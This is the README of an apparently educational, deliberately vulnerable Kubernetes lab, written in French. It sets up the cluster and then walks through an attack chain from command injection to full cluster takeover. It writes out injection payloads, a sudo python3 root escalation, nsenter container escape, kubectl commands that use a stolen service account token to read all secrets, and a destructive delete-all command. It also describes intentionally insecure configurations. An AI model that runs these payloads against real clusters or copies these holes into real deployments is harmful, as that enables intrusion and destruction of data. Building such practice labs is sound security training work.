# Scénario de Cluster Kubernetes Vulnérable

Ce projet met en place un environnement de cluster Kubernetes conçu pour démontrer un chemin d'attaque en plusieurs étapes, illustrant des vulnérabilités et des mauvaises configurations courantes.

**Objectif du Scénario :** Déployer un cluster avec des vulnérabilités intentionnelles, permettant à un attaquant de passer d'un service web exposé à une compromission complète du cluster.

**Architecture :**

*   **Pod 1 (`pod1-webapp`)**:
    *   Exécute une application web Flask accessible depuis l'extérieur du cluster (via NodePort).
    *   Vulnérable à l'**Injection de Commandes** via un endpoint `/ping`.
    *   S'exécute en tant que `appuser`, mais a `sudo NOPASSWD` configuré pour `/usr/bin/python3`, permettant l'**Escalade de Privilèges** dans le conteneur.
    *   La Network Policy autorise la sortie (*egress*) *uniquement* vers le Pod 2 sur le port 22.
*   **Pod 2 (`pod2-ssh`)**:
    *   Exécute un serveur SSH, accessible *uniquement* depuis le Pod 1 (via un service ClusterIP et une Network Policy).
    *   Autorise la connexion root via SSH avec un **mot de passe faible** (`root:password123`).
    *   S'exécute en tant que **conteneur privilégié** (`securityContext.privileged: true`) et avec `hostPID: true`, permettant l'**Évasion de Pod / Sortie de Conteneur**.
    *   Utilise un `ServiceAccount` (`cluster-admin-sa`) lié à un `ClusterRole` (`cluster-admin-role`) avec des permissions excessivement permissives (`* * *`), permettant la **Prise de Contrôle du Cluster**.
*   **Network Policies** : Forcent le flux de communication prévu : Externe -> Pod 1 -> Pod 2.

## Prérequis

*   Docker installé et en cours d'exécution.
*   `kubectl` installé.
*   Un cluster Kubernetes en cours d'exécution (par exemple, Docker Desktop Kubernetes, Minikube, OrbStack, k3d, etc.). Assurez-vous que `kubectl` est configuré pour pointer vers votre cluster cible.

## Instructions d'Installation

0.  **Démarrer Minikube (si utilisé) :**
    Si vous utilisez Minikube avec le driver Docker, démarrez-le et configurez votre shell pour utiliser le démon Docker de Minikube. Cela garantit que les images construites localement sont disponibles pour le cluster Minikube.
    ```bash
    minikube start --driver=docker
    eval $(minikube docker-env)
    ```
    *(Si vous utilisez un autre environnement Kubernetes comme Docker Desktop ou OrbStack, cette étape n'est généralement pas nécessaire car ils partagent l'environnement Docker de l'hôte.)*

1.  **Cloner le Dépôt (si applicable) :**
    ```bash
    # git clone <url-du-depot>
    # cd <repertoire-du-depot>
    ```

2.  **Construire les Images Docker :**
    Construisez localement les images pour les deux pods.
    ```bash
    docker build -t vulnerable-webapp:latest pod1-webapp-src/
    docker build -t ssh-server:latest pod2-ssh-server-src/
    ```
    *(Note : Si votre cluster Kubernetes n'utilise pas automatiquement les images de votre démon Docker local (par exemple, un cluster distant), vous devrez pousser ces images vers un registre accessible par le cluster et mettre à jour les noms d'images dans les fichiers `k8s/*.yaml`.)*

3.  **Déployer sur Kubernetes :**
    Appliquez tous les fichiers manifestes Kubernetes situés dans le répertoire `k8s`.
    ```bash
    kubectl apply -f k8s/
    ```

4.  **Vérifier le Déploiement :**
    Vérifiez que les pods s'exécutent et que les services sont créés.
    ```bash
    kubectl get pods -o wide
    kubectl get services
    ```
    Vous devriez voir les pods `pod1-webapp-<hash>` et `pod2-ssh-<hash>` à l'état `Running`. Notez le NodePort assigné à `pod1-webapp-service` (par exemple, `3xxxx`).

## Chemin d'Exploitation

1.  **Accéder à l'Application Web (Pod 1) :**
    Ouvrez votre navigateur et naviguez vers `http://<IP_DU_NODE>:<NODE_PORT>` ou `http://localhost:<NODE_PORT>` si vous utilisez Docker Desktop/OrbStack. (Remplacez `<NODE_PORT>` par le port noté à l'étape 4 de l'Installation).

2.  **Injection de Commandes (Pod 1) :**
    Utilisez le champ "Host to ping" ou manipulez l'URL pour injecter des commandes.
    *   Exemple : `http://localhost:<NODE_PORT>/ping?host=127.0.0.1; id`
    *   Objectif : Obtenir l'exécution de commandes en tant que `appuser`. Essayez `ls /`, `whoami`, `cat /etc/passwd`.

3.  **Escalade de Privilèges (Pod 1) :**
    Abusez de la configuration `sudo NOPASSWD` pour python3. Injectez une commande qui utilise `sudo python3` pour exécuter du code en tant que root dans le conteneur.
    *   Exemple de Payload pour l'URL : `127.0.0.1; sudo python3 -c 'import os; os.system("id")'`
    *   Obtenir un shell root : `127.0.0.1; sudo python3 -c 'import os; os.system("/bin/bash")'` (Note : Ce shell interactif peut être délicat via les requêtes web, souvent on établirait un reverse shell ici).

4.  **Découverte Réseau (Trouver Pod 2) :**
    Depuis votre shell root / exécution de commandes sur le Pod 1, trouvez l'adresse IP interne du Pod 2.
    *   Le nom du service interne est `pod2-ssh-service`. Le DNS devrait le résoudre dans le cluster.
    *   Essayez de le pinger : `ping pod2-ssh-service`
    *   Ou utilisez des outils d'analyse réseau (si installés ou installables) : `apt-get update && apt-get install -y iproute2 net-tools nmap; ip a; nmap <PLAGE_IP_CLUSTER>` (Trouvez la plage via `ip a`).
    *   Alternativement, vérifiez les variables d'environnement ou les mécanismes de découverte de service si disponibles. L'IP du service a été listée par `kubectl get svc` également (`pod2-ssh-service` `CLUSTER-IP`). Supposons que c'est `192.168.194.218` basé sur la sortie précédente.

5.  **Mouvement Latéral (SSH vers Pod 2) :**
    Connectez-vous en SSH au Pod 2 en utilisant les identifiants root faibles (`root` / `password123`). Vous devrez peut-être d'abord installer un client SSH sur le Pod 1 (`apt-get update && apt-get install -y openssh-client`).
    ```bash
    # Depuis le shell root sur Pod 1
    ssh root@<IP_POD_2_ou_NOM_SERVICE> 
    # Entrez le mot de passe : password123
    ```
    Vous devriez maintenant avoir un shell root sur le Pod 2.

6.  **Évasion de Pod / Sortie de Conteneur (Depuis Pod 2) :**
    Le Pod 2 s'exécute en tant que privilégié (`privileged: true`) et avec `hostPID: true`. Cela permet d'accéder aux ressources de l'hôte. Il existe de nombreuses techniques, voici quelques concepts :
    *   **Accéder aux Processus Hôtes :** Puisque `hostPID` est vrai, `ps aux` à l'intérieur du conteneur montre les processus de l'*hôte*. Vous pourriez trouver des informations sensibles ou des processus avec lesquels interagir.
    *   **Accéder au Système de Fichiers Hôte :** Les conteneurs privilégiés peuvent souvent monter les périphériques hôtes (`fdisk -l` pourrait montrer les disques hôtes) ou trouver des moyens d'accéder au système de fichiers hôte, potentiellement via `/proc/<pid_hote>/root/`.
    *   **Créer un Pod Hôte Privilégié :** Utilisez le token de compte de service monté (voir étape suivante) pour créer un nouveau pod directement sur le réseau/namespace de l'hôte avec des montages hôtes.
    *   **Exécuter une Commande sur l'Hôte :** Trouvez le PID 1 de l'hôte (processus init) via `ps aux`, puis utilisez `nsenter` pour entrer dans les namespaces de l'hôte et exécuter des commandes : `nsenter --target <PID_1_HOTE> --mount --uts --ipc --net --pid <commande>`.

7.  **Prise de Contrôle du Cluster (Depuis Pod 2) :**
    Le token du ServiceAccount `cluster-admin-sa` est monté dans le Pod 2 (généralement à `/var/run/secrets/kubernetes.io/serviceaccount/token`). Ce compte est lié au `ClusterRole` `cluster-admin-role` avec les permissions `* * *`.
    *   Installez `kubectl` à l'intérieur du Pod 2 (`apt-get update && apt-get install -y kubectl`).
    *   Utilisez le token monté pour interagir avec l'API Kubernetes en tant que cluster-admin :
        ```bash
        # Dans le shell du Pod 2
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        APISERVER=https://kubernetes.default.svc # Adresse interne par défaut du serveur API

        # Tester l'accès
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get nodes
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get secrets --all-namespaces 
        # Vous avez maintenant le contrôle total du cluster !
        ```
    *   Simuler l'arrêt : `kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT delete deployment --all --all-namespaces` (Ne pas exécuter sauf si intentionnel !)

## Nettoyage

Pour supprimer toutes les ressources créées par ce scénario :
```bash
kubectl delete -f k8s/
```
Vous pouvez également vouloir supprimer les images Docker :
```bash
docker rmi vulnerable-webapp:latest ssh-server:latest